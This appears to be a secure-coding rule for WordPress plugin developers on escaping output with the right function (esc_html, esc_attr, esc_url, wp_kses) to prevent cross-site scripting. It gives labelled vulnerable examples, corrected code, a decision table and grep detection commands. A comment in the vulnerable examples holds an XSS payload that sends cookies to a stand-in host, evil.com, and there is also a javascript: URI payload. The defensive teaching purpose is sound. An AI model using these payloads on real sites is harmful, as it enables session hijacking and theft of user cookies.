---
title: Escape All Output with the Correct Context Function
description: "WordPress provides context-specific escaping functions. Using the wrong one — or none — enables XSS. Match esc_html, esc_attr, esc_url, wp_kses to the output context."
impact: CRITICAL
impact_description: prevents cross-site scripting enabling session hijacking, admin takeover, and defacement
tags: [security, xss, escaping, output, wordpress]
cwe: ["CWE-79"]
owasp: ["A07:2021"]
detection_grep: "echo $|echo $_|print $_"
---

## Escape All Output with the Correct Context Function

**Impact: CRITICAL (prevents cross-site scripting enabling session hijacking, admin takeover, and defacement)**

WordPress provides context-specific escaping functions. Every piece of dynamic data rendered in HTML must be escaped with the function that matches its output context. Using `esc_html()` inside an `href` attribute does not prevent `javascript:` URI injection — you need `esc_url()`. Using no escaping at all is the #1 source of WordPress XSS vulnerabilities.

**The rule: escape late, escape with the right function for the context.**

**Incorrect (raw output or wrong escaping function):**

```php
// ❌ Raw user input echoed — classic reflected XSS
echo '<input type="text" value="' . $_GET['search'] . '">';
// Attacker: ?search="><script>document.location='https://evil.com/?c='+document.cookie</script>

// ❌ Option value echoed without escaping — stored XSS
echo '<h2>' . get_option( 'widget_title' ) . '</h2>';

// ❌ Wrong function for URL context — esc_html doesn't block javascript: URIs
echo '<a href="' . esc_html( $user_submitted_url ) . '">Link</a>';
// Attacker submits: javascript:alert(document.cookie) → esc_html() passes it through

// ❌ Trusting post meta (any editor can set arbitrary meta values)
echo '<div class="' . get_post_meta( $post->ID, 'custom_class', true ) . '">';
```

**Correct (right escaping function for each context):**

```php
// ✅ HTML attribute context → esc_attr()
echo '<input type="text" value="' . esc_attr( $_GET['search'] ) . '">';

// ✅ HTML text content → esc_html()
echo '<h2>' . esc_html( get_option( 'widget_title' ) ) . '</h2>';

// ✅ URL context → esc_url() (blocks javascript:, data:, and invalid protocols)
echo '<a href="' . esc_url( $user_submitted_url ) . '">Link</a>';

// ✅ CSS class → sanitize_html_class() or esc_attr()
echo '<div class="' . esc_attr( get_post_meta( $post->ID, 'custom_class', true ) ) . '">';

// ✅ JavaScript string → esc_js() (only for inline JS, not recommended)
echo '<script>var title = "' . esc_js( $title ) . '";</script>';

// ✅ Rich HTML that should allow some tags → wp_kses_post()
echo wp_kses_post( $user_bio );

// ✅ Custom allowed tags → wp_kses()
$allowed = [
    'a'      => [ 'href' => [], 'title' => [] ],
    'strong' => [],
    'em'     => [],
];
echo wp_kses( $comment_html, $allowed );
```

**Escaping function decision tree:**

| Output Context | Function | Blocks |
|---------------|----------|--------|
| Between HTML tags | `esc_html()` | `<script>`, HTML tags |
| Inside `=""` attribute | `esc_attr()` | Quote breaking, event handlers |
| Inside `href=""` or `src=""` | `esc_url()` | `javascript:`, `data:`, bad protocols |
| Textarea content | `esc_textarea()` | Tag injection in textareas |
| Inline JS string | `esc_js()` | Quote breaking in JS |
| Rich HTML (post content) | `wp_kses_post()` | Dangerous tags, keeps safe HTML |
| Custom HTML subset | `wp_kses($data, $allowed)` | Everything not in allowlist |

**Translated strings must also be escaped:**

```php
// ❌ Translators can inject HTML via translation files
echo __( 'Welcome back!', 'my-plugin' );
_e( 'Settings saved.', 'my-plugin' );

// ✅ Always use the escaped variants for output
echo esc_html__( 'Welcome back!', 'my-plugin' );
esc_html_e( 'Settings saved.', 'my-plugin' );
echo '<input placeholder="' . esc_attr__( 'Search...', 'my-plugin' ) . '">';
```

**Detection hints:**

```bash
# Find direct echo of superglobals
grep -rn "echo.*\\\$_\(GET\|POST\|REQUEST\|COOKIE\|SERVER\)" wp-content/plugins/ --include="*.php"
# Find echo without escaping function
grep -rn "echo.*get_option\|echo.*get_post_meta\|echo.*get_user_meta" wp-content/plugins/ --include="*.php" | grep -v "esc_\|wp_kses"
# Find _e() without esc_ wrapper
grep -rn "\b_e\s*(" wp-content/plugins/ --include="*.php"
```

Reference: [WordPress Escaping](https://developer.wordpress.org/apis/security/escaping/) · [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
